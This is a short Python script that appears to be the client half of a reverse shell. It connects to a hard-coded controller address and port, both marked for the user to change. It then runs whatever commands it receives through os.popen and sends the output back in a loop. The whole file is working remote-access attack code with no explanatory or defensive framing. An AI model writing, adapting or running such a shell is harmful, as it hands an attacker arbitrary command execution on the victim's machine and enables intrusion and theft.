import socket
import os

client_socket = socket.socket()
HOST = "10.0.0.42" # CHANGE THIS
PORT = 9999 # CHANGE THIS
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

client_socket.connect((HOST, PORT))

while True:
    command_to_run = client_socket.recv(1024).decode()
    if command_to_run == "exit":
        break
    command_output = os.popen(command_to_run).read()
    client_socket.send(command_output.encode())

client_socket.close()
